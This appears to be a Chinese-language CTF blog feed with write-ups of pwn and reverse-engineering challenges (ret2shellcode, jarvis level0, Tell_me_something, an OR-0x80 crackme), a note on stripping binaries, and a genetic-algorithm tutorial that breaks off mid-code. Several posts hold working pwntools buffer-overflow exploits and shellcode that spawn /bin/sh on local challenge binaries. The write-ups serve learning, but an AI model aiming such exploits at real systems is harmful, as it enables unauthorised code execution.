class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">"linux"</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">"i386"</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token punctuation">)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ret2sc"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#获得sh的命令多种多样，并且有不同系统版本的sh</span><span class="token comment" spellcheck="true">#shellcode = asm(shellcraft.execve("/bin/sh"))</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>i386<span class="token punctuation">.</span>linux<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> shellcode<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#flat模块能将pattern字符串和地址结合并且转为字节模式</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>cyclic<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x804a060</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>运行效果：</p></blockquote><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/23/5bcf2c13d7442.png" class="lazyload"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>内容涉及 context 模式设置，asm模块，shellcraft模块，patch操作，return to shellcode题型，pwntools flat模块。</p><p>今天先混到这儿。。。我真菜😭。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> 二进制安全 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Re-10月22-shiyanbar-10000</title>
      <link href="/2018/10/22/Re-10%E6%9C%8822-shiyanbar-10000/"/>
      <url>/2018/10/22/Re-10%E6%9C%8822-shiyanbar-10000/</url>
      
        <content type="html"><![CDATA[<p>……</p><a id="more"></a><h1 id="Re-10月22-shiyanbar-10000"><a href="#Re-10月22-shiyanbar-10000" class="headerlink" title="Re-10月22-shiyanbar-10000"></a>Re-10月22-shiyanbar-10000</h1><blockquote><p>emmm记录一下实验吧里一道简单的逆向，实际上就是一种思维方式。</p></blockquote><blockquote><p>拿到一个exe文件,运行效果如下：</p><p><img src="https://i.loli.net/2018/10/22/5bcd6ebe22927.png" alt=""></p><p>对没错就是一个喵字，然后输入内容，会输出wrong，可以猜测输入了正确的字符后会输出good。</p></blockquote><h2 id="静态分析程序逻辑"><a href="#静态分析程序逻辑" class="headerlink" title="静态分析程序逻辑"></a>静态分析程序逻辑</h2><blockquote><p>令人绝望的是，ida6.8和ida7.0对此程序main函数分析的伪代码居然不同，这里我们看7.0的：</p><p><img src="https://i.loli.net/2018/10/22/5bcd72ad9ac34.png" alt=""></p><p>简单分析可以知道，这里是将我们的输入按字节与0x80u进行或操作，即按位或，然后对处理后的内容进行字符串比较，然后得出结果。上图中的v4到v16实际上都是下图中的16进制转为整型的内容，因为一个字节可以表示的数字范围为-128到127。</p><p><img src="https://i.loli.net/2018/10/22/5bcd71a486530.png" alt=""></p><p>然后我就要傻逼😭地说，这些内容肯定跟比较是有关系的。</p><p>试试将0xe6与0x80</p><p>我们注意到<code>.text:004013F8</code>位置的命令是将eax与0xFFFFFF80相或，为啥我们的伪代码中却是与0x80u相或呢？因为我们是按字节来进行或操作，所以0xFFFFFF80前面的三个字节也就没有了必要。</p><p>唉实在是这题目逻辑太含糊不清（可能是我太菜┭┮﹏┭┮）</p></blockquote><h2 id="动态程序逻辑分析"><a href="#动态程序逻辑分析" class="headerlink" title="动态程序逻辑分析"></a>动态程序逻辑分析</h2><blockquote><p>通过ollydbg我们来进行动态调试，首先载入程序，查找字符串：</p><p><img src="https://i.loli.net/2018/10/22/5bcd7825508d0.png" alt=""></p><p>然后我们找一下”喵”，出现的位置，并且在找到的字符串比较函数下断点：</p><p><img src="https://i.loli.net/2018/10/22/5bcd78b3669b0.png" alt=""></p><p>然后运行，并且随便输入一个字符串：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/22/5bcd790b40671.png" class="lazyload"></p><p>栈中出现了两个字符串比较的数据，在数据窗口跟随，可以发现s2为13个字节，正好对应前面的那13个数据</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/22/5bcd79f764ec2.png" class="lazyload"></p><p>但是光靠这些信息我们能拿到我们想要的答案吗？我们可以对s1进行一些操作，之前输入的字符串为<code>helloword 或操作处理后==&gt; E8 E5 EC EC EF F7 EF F2 E4</code>。我看网上很多教程是直接通过异或，将s2异或0x80得到结果（脑洞？？）</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/22/5bcd7e34f2571.png" class="lazyload"></p><p>一个字节的情况下，可能通过异或操作并且根据已知条件能够得到或操作的原操作数，但是我可能太菜了不求甚解，只能写个脚本枚举一下flag好了（根据ida根本难以看出来好不好😭还是太菜了不能怪ida)。</p></blockquote><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><blockquote><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token comment" spellcheck="true">#</span>__Author__ <span class="token operator">=</span><span class="token string">"Yof3ng"</span>lists <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xE6</span><span class="token punctuation">,</span><span class="token number">0xEC</span><span class="token punctuation">,</span><span class="token number">0xE1</span><span class="token punctuation">,</span><span class="token number">0xE7</span><span class="token punctuation">,</span><span class="token number">0xBA</span><span class="token punctuation">,</span><span class="token number">0xF4</span><span class="token punctuation">,</span><span class="token number">0xE5</span><span class="token punctuation">,</span><span class="token number">0xF3</span><span class="token punctuation">,</span><span class="token number">0xF4</span><span class="token punctuation">,</span><span class="token number">0xF4</span><span class="token punctuation">,</span><span class="token number">0xE5</span><span class="token punctuation">,</span><span class="token number">0xF3</span><span class="token punctuation">,</span><span class="token number">0xF4</span><span class="token punctuation">]</span>flag<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> a <span class="token keyword">in</span> lists<span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i<span class="token operator">|</span><span class="token number">0x80</span><span class="token operator">==</span>a<span class="token punctuation">:</span>            flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre></blockquote><p>运行效果：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/22/5bcd7ed7225ae.png" class="lazyload"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 二进制安全 </tag>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pwn-10月21-jarvis-level0</title>
      <link href="/2018/10/21/Pwn-10%E6%9C%8821-jarvis-level0/"/>
      <url>/2018/10/21/Pwn-10%E6%9C%8821-jarvis-level0/</url>
      
        <content type="html"><![CDATA[<p>……</p><a id="more"></a><h1 id="Pwn-10月21-jarvis-level0"><a href="#Pwn-10月21-jarvis-level0" class="headerlink" title="Pwn-10月21-jarvis-level0"></a>Pwn-10月21-jarvis-level0</h1><blockquote><p>这题是补上昨天没写完的一题。。。虽然很简单😭😭</p></blockquote><h2 id="检查保护措施"><a href="#检查保护措施" class="headerlink" title="检查保护措施"></a>检查保护措施</h2><blockquote><p><code>file level0</code> and <code>checksec level0</code>:</p><p><img src="https://i.loli.net/2018/10/21/5bcbd13050ba5.png" alt=""></p><p>可以看到这种简单的pwn题基本不开保护措施，不然菜鸡我也玩不下去。。。</p></blockquote><h2 id="静态分析程序逻辑"><a href="#静态分析程序逻辑" class="headerlink" title="静态分析程序逻辑"></a>静态分析程序逻辑</h2><blockquote><p>一用IDA Pro打开程序文件看看main函数就脑残地看到了<code>return vulnerable_function()</code></p><p><img src="https://i.loli.net/2018/10/21/5bcbd173656cc.png" alt=""></p><p>跟着去这个函数看一看:</p><p><img src="https://i.loli.net/2018/10/21/5bcbd20189ae1.png" alt=""></p><p>可以看到定义的buf空间为0x80,而能够用read函数读取的为0x200，能够造成栈溢出，并且实现函数地址覆盖。而且我们也可以看到一个callsystem函数，点进去看看可以发现<code>system(&quot;/bin/sh&quot;)</code>:</p><p><img src="https://i.loli.net/2018/10/21/5bcbd2752027e.png" alt=""></p><p>那么根据静态分析出来的信息大概可以确定：首先通过main函数返回到vulnerable_function函数，然后通过vulnerable_function函数将某处返回地址覆盖为callsystem函数的地址，然后getshell。</p></blockquote><h2 id="动态分析程序逻辑"><a href="#动态分析程序逻辑" class="headerlink" title="动态分析程序逻辑"></a>动态分析程序逻辑</h2><blockquote><p>gdb 调试一下level0，先单步执行到vulnerable_function()函数：</p><p><img src="https://i.loli.net/2018/10/21/5bcbd5dc96afe.png" alt=""></p><p>先过一遍该函数，然后记录关键信息：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/21/5bcbd6954fadf.png" class="lazyload"></p><p>计算一下距离：<code>hex(0x7fffffffdfc0 + 8 - 0x7fffffffdf40) = 0x88</code>，那为什么比定义的0x80要多0x08的距离呢？这里我们可以通过ida pro的<code>alt + k</code>快捷键查看buf的栈帧，会发现：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/21/5bcbd939b1a8b.png" class="lazyload"></p><p>通过gdb调试里面的多个关键信息对比，其实多出来的0x08是栈底的内容，继续下一步，就可以看到最开始被压入栈中的返回地址被置栈顶，准备返回：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/21/5bcbda659d6b6.png" class="lazyload"></p><p>那么我们就可以开始构造exp啦😄。</p></blockquote><h2 id="攻破"><a href="#攻破" class="headerlink" title="攻破"></a>攻破</h2><blockquote><p>通过上面的逻辑我们可以写出如下exp：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span>Author <span class="token operator">=</span> <span class="token string">"Yof3ng"</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"level0"</span><span class="token punctuation">)</span>callsystem_addr <span class="token operator">=</span> <span class="token number">0x400596</span>padding <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">+</span> <span class="token number">0x08</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token string">"a"</span>payload <span class="token operator">=</span> padding <span class="token operator">+</span> callsystem_addrio<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></blockquote><p>运行效果：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/21/5bcbdc2dbe46c.png" class="lazyload"></p><p>然后就getshell啦😍。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> 二进制安全 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pwn-10月20-one-of-jarvis</title>
      <link href="/2018/10/20/Pwn-10%E6%9C%8820-two-of-jarvis/"/>
      <url>/2018/10/20/Pwn-10%E6%9C%8820-two-of-jarvis/</url>
      
        <content type="html"><![CDATA[<p>……</p><a id="more"></a><h1 id="Pwn-10月20-jarvis-Tell-me-something"><a href="#Pwn-10月20-jarvis-Tell-me-something" class="headerlink" title="Pwn-10月20-jarvis-Tell_me_something"></a>Pwn-10月20-jarvis-Tell_me_something</h1><blockquote><p>今天简单地做一下jarvis oj的两道题，<code>level0</code>和<code>Tell_me_something</code>.</p><p>PS:凌晨0:07  明天写level0，其实两题差不多的逻辑，挺简单的。</p></blockquote><h2 id="Tell-me-something"><a href="#Tell-me-something" class="headerlink" title="Tell_me_something"></a>Tell_me_something</h2><h3 id="检查保护措施"><a href="#检查保护措施" class="headerlink" title="检查保护措施"></a>检查保护措施</h3><blockquote><p>首先，<code>file gestbook</code>and<code>checksec guestbook</code>，简单地看看文件信息和保护措施</p><p><img src="https://i.loli.net/2018/10/20/5bcb420ce98b7.png" alt=""></p><p>可以看到它是没有脱衣服的，然后没有开启保护措施。</p></blockquote><h3 id="静态分析程序逻辑"><a href="#静态分析程序逻辑" class="headerlink" title="静态分析程序逻辑"></a>静态分析程序逻辑</h3><blockquote><p>用IDA pro 看一下该程序的汇编代码，可以看到main函数：</p><p><img src="https://i.loli.net/2018/10/20/5bcb42684db9f.png" alt=""></p><p>F5大法，看看伪代码，很简单就可以判断出溢出点，因为read函数可以将超出0x88大小的数据读入栈空间：</p><p><img src="https://i.loli.net/2018/10/20/5bcb42f7dd043.png" alt=""></p><p>然后我们也可以看到good_game函数里面有我们要的关键信息：</p><p><img src="https://i.loli.net/2018/10/20/5bcb498c0b0c9.png" alt=""></p><p>那么到这里基本上可以确定，是通过溢出来使程序跳转到good_game函数从而得到flag。</p></blockquote><h3 id="动态分析程序逻辑"><a href="#动态分析程序逻辑" class="headerlink" title="动态分析程序逻辑"></a>动态分析程序逻辑</h3><blockquote><p>首先放linux里面跑一跑：</p><p><img src="https://i.loli.net/2018/10/20/5bcb48a91dfc9.png" alt=""></p><p>确实产生了溢出的问题，然后这里我们用一下linux平台的一个二进制分析软件，radare2，说实话还是可以用的，这个软件集成了很多工具，并且也可以进行部分地动态调试（<a href="https://xz.aliyun.com/t/1514/#toc-7" target="_blank" rel="noopener">radare2详细教程</a>）：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/20/5bcb495987b21.png" class="lazyload"></p><p>接下来我们用gdb调试一下，先构造一个0x88长度的padding输入，再看看栈空间：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/20/5bcb4c838d5dd.png" class="lazyload"></p><p>可以知道将长度为0x88的padding填充到栈空间之后，还可以进行覆盖，因为可以读取最大0x100（256）大小的字符，而ebp栈底出界就是一个函数地址，我们可以看看这个函数地址有什么关键性的操作举动：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/20/5bcb4d6959622.png" class="lazyload"></p><p>进行单步执行测试查看该溢出点能够被覆盖的地址是否会被返回，先重新查看一下该栈位置存储的函数地址为多少：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/20/5bcb4f4e7f83a.png" class="lazyload"></p><p>可以看到存储的函数地址为0x7ffff7a3fa87，到栈位置即将改变时，进行下一步验证：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/20/5bcb4e0d8a46d.png" class="lazyload"></p><p>执行下一步：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/20/5bcb4e84bc436.png" class="lazyload"></p><p>再下一步就将该函数地址放入了RIP，作为下一步运行的函数指令：<br><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/20/5bcb4ed83e345.png" class="lazyload"></p><p>那么到这里已经明白可以返回该地址覆盖的内容，写exp了。</p></blockquote><h3 id="攻破"><a href="#攻破" class="headerlink" title="攻破"></a>攻破</h3><blockquote><p>用0x88长度的内容做padding，然后将good_game的地址放到尾部，然后执行即可。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token comment" spellcheck="true">#exp.py</span>Author <span class="token operator">=</span> <span class="token string">"Yof3ng"</span><span class="token keyword">from</span> pwn impor <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'guestbook'</span><span class="token punctuation">)</span>good_game_addr <span class="token operator">=</span> <span class="token number">0x400620</span>padding <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x88</span>payload <span class="token operator">=</span> padding <span class="token operator">+</span> p64<span class="token punctuation">(</span>good_game_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">print</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></blockquote><p>运行结果：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/21/5bcb5203a355b.png" class="lazyload"></p><p>啊本来今天打算写两题的博客，看来这篇只能水了，太晚了先睡了。😭😭</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> 二进制安全 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pwn-10月17-strip</title>
      <link href="/2018/10/17/Pwn-10%E6%9C%8817-strip/"/>
      <url>/2018/10/17/Pwn-10%E6%9C%8817-strip/</url>
      
        <content type="html"><![CDATA[<p>……</p><a id="more"></a><h1 id="Pwn-10月17-strip"><a href="#Pwn-10月17-strip" class="headerlink" title="Pwn-10月17-strip"></a>Pwn-10月17-strip</h1><blockquote><p>strip是linux下的一个命令，用于给特定文件消除，剥离一些符号信息和调试信息，通常被叫做“脱衣服”，可以减小可执行文件的体积，又不影响其运行，但是当这种程序出现在二进制分析中就比较麻烦了，因为用strip命令处理过的程序，反编译可能会比较混乱，有时候也需要恢复符号表来完成分析。</p><p>简单编译一个test.c文件，脱脱衣服试试：</p><p><img src="https://i.loli.net/2018/10/17/5bc759646ed19.png" alt=""></p><p>可以看到编译后的test文件信息，not stripped，这里再用到linux下的nm命令，是names的缩写，能够列出文件的符号值，函数和全局变量等信息，更官方一点的就是这样的解释：<code>nm工具列出.o文件、.a文件、.so文件等的符号信息，包括诸如符号的值，符号类型及符号名称等。所谓符号，通常指定义出的函数，全局变量等等。</code>。</p><p><img src="https://i.loli.net/2018/10/17/5bc75a09ec273.png" alt=""></p><p>像 hacklu2018的一个题，就是脱了衣服的，没有符号表：</p><p><img src="https://i.loli.net/2018/10/17/5bc75aa3b1afa.png" alt=""></p><p>那么给test文件脱一下试试：</p><p><img src="https://i.loli.net/2018/10/17/5bc75ae6dcb39.png" alt=""></p><p>可以看到符号表已经被脱下，并且不影响正常运行。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>遗传算法</title>
      <link href="/2018/10/17/%E9%81%97%E4%BC%A0%E7%AE%97%E6%B3%95/"/>
      <url>/2018/10/17/%E9%81%97%E4%BC%A0%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>……</p><a id="more"></a><h1 id="遗传算法（Genetic-Algorithm）"><a href="#遗传算法（Genetic-Algorithm）" class="headerlink" title="遗传算法（Genetic Algorithm）"></a>遗传算法（Genetic Algorithm）</h1><blockquote><p>算法都是用来解决实际问题，提高效率的，而学好算法对一个信息安全从业者来说，应该也是必要的。开始接触这些算法，也逐渐意识到知识面广阔的重要，比如遗传算法就需要知道一定的生物知识，可能这就是培训机构无法弥补的地方吧。</p></blockquote><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>先引用一下遗传算法的解释：</p><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; <strong>遗传算法（Genetic Algorithm）</strong>是模拟达尔文生物进化论的自然选择和遗传学机理的生物进化过程的计算模型，是一种通过模拟自然进化过程搜索最优解的方法。遗传算法是从代表问题可能潜在的解集的一个<strong>种群（population）</strong>开始的，而一个种群则由经过<strong>基因（gene）</strong>编码的一定数目的<strong>个体(individual)</strong>组成。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 每个个体实际上是<strong>染色体(chromosome)</strong>带有特征的实体。染色体作为遗传物质的主要载体，即多个基因的集合，其内部表现（即基因型）是某种基因组合，它决定了个体的形状的外部表现，如黑头发的特征是由染色体中控制这一特征的某种基因组合决定的。因此，在一开始需要实现从表现型到基因型的映射即编码工作。由于仿照基因编码的工作很复杂，我们往往进行简化，如<strong>二进制编码</strong>，初代种群产生之后，按照适者生存和优胜劣汰的原理，<strong>逐代（generation）</strong>演化产生出越来越好的近似解，在每一代，根据问题域中个体的<strong>适应度（fitness）</strong>大小<strong>选择（selection）</strong>个体，并借助于<strong>自然遗传学的遗传算子（genetic operators）</strong>进行<strong>组合交叉（crossover）和变异（mutation）</strong>，产生出代表新的解集的种群。这个过程将导致种群像<strong>自然进化</strong>一样的后生代种群比前代更加适应于环境，末代种群中的最优个体经过<strong>解码（decoding）</strong>，可以作为问题近似最优解。</p><p>遗传算法的组成主要包括4个部分：<br>（1）编码<br>（2）适应度函数<br>（3）遗传算子（选择，交叉，变异）<br>（4）运行参数 </p><p><strong>选择、交叉和变异</strong>构成了遗传算法的遗传操作；<strong>参数编码、初始群体的设定、适应度函数的设计、遗传操作设计、控制参数</strong>设定五个要素组成了遗传算法的核心内容。</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181018083211.png" alt=""></p></blockquote><h2 id="编码与解码"><a href="#编码与解码" class="headerlink" title="编码与解码"></a>编码与解码</h2><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; 遗传算法的实行，首先需要确定编码和解码的形式，生物体的遗传就是通过染色体以及基因进行，编码形式多种多样，能够使用字母，实数，或者是二进制来进行编码。但是因为博主刚开始学遗传算法，便拿SGA（基本遗传算法）来对遗传算法进行一个简单的理解。</p><p>直接上例题说明：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181018095823.png" alt=""></p><p>我们需要求此函数在[-2,2]区间下的最大值，先用python画一下函数图形。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span>__Author__ <span class="token operator">=</span> <span class="token string">"Yof3ng"</span><span class="token keyword">import</span> math<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltx <span class="token operator">=</span> np<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">10000</span><span class="token punctuation">)</span>y<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#通过循环计算每一个x值对应的y值</span><span class="token keyword">for</span> i <span class="token keyword">in</span> x<span class="token punctuation">:</span>    a<span class="token operator">=</span> <span class="token number">200</span><span class="token operator">*</span>np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0.05</span><span class="token operator">*</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>sin<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#通过matplotlib库绘出函数图形</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>annotate<span class="token punctuation">(</span><span class="token string">'local max'</span><span class="token punctuation">,</span> xy<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">1.4</span><span class="token punctuation">,</span> max<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> xytext<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            arrowprops<span class="token operator">=</span>dict<span class="token punctuation">(</span>facecolor<span class="token operator">=</span><span class="token string">'black'</span><span class="token punctuation">,</span> shrink<span class="token operator">=</span><span class="token number">0.05</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>函数图像如下：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181018183218.png" alt=""></p><p>[-2,2]区间已经分为10000个等份，而我们需要找出最大值，SGA基本遗传算法就是用二进制编码来表示的，那么我们把2^14，即十四位二进制用作编码来表示个体：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181018105024.png" alt=""></p></blockquote><h2 id="初始化种群"><a href="#初始化种群" class="headerlink" title="初始化种群"></a>初始化种群</h2><blockquote><p>已经决定用十四位二进制来表示种群个体了，那么我们就可以对种群进行初始化：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#初始化种群个体</span><span class="token keyword">def</span> <span class="token function">Init_popu</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">:</span>    population<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i  <span class="token keyword">in</span> range<span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">:</span>        entity<span class="token operator">=</span><span class="token string">''</span>       <span class="token comment" spellcheck="true">#随机产生个体</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            entity <span class="token operator">=</span> entity<span class="token operator">+</span>str<span class="token punctuation">(</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        population<span class="token punctuation">.</span>append<span class="token punctuation">(</span>entity<span class="token punctuation">)</span>    <span class="token keyword">return</span> population</code></pre><p>将种群初始化编码后，自定义解码方法：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#解码</span><span class="token keyword">def</span> <span class="token function">Decode</span><span class="token punctuation">(</span>population<span class="token punctuation">)</span><span class="token punctuation">:</span>   flag <span class="token operator">=</span> <span class="token number">0</span>   Dpopulation <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>   <span class="token comment" spellcheck="true">#print(population)</span>   <span class="token keyword">for</span> i <span class="token keyword">in</span> population<span class="token punctuation">:</span>       <span class="token comment" spellcheck="true">#将二进制转换为整型数值</span>       x <span class="token operator">=</span> eval<span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token operator">+</span>i<span class="token punctuation">)</span>       x <span class="token operator">=</span> x<span class="token operator">/</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">14</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">-</span><span class="token number">2</span>       Dpopulation<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># someone = str(population[flag])</span>       <span class="token comment" spellcheck="true"># express[i] = DNAdict[someone]</span>   <span class="token keyword">return</span> population<span class="token punctuation">,</span>Dpopulation   <span class="token comment" spellcheck="true">#return express</span>   <span class="token comment" spellcheck="true"># print(bx[0:100])</span>   <span class="token comment" spellcheck="true"># print(ast.literal_eval('0b'+bx[1]))</span></code></pre></blockquote><h2 id="计算适应度"><a href="#计算适应度" class="headerlink" title="计算适应度"></a>计算适应度</h2><blockquote><p>根据种群个体的适应度我们可以进行后面的选择淘汰方法，不同的问题有不同的适应度计算方法<br> 而本例题则，直接用目标函数作为适应度函数</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#根据函数原型计算表现型（y值)，即适应度</span><span class="token keyword">def</span> <span class="token function">gafunction</span><span class="token punctuation">(</span>population<span class="token punctuation">,</span>dpopulation<span class="token punctuation">)</span><span class="token punctuation">:</span>    y<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    flag<span class="token operator">=</span><span class="token number">0</span>    pp<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#通过循环计算每一个x值对应的y值</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> dpopulation<span class="token punctuation">:</span>        a<span class="token operator">=</span> <span class="token number">200</span><span class="token operator">*</span>np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0.05</span><span class="token operator">*</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token 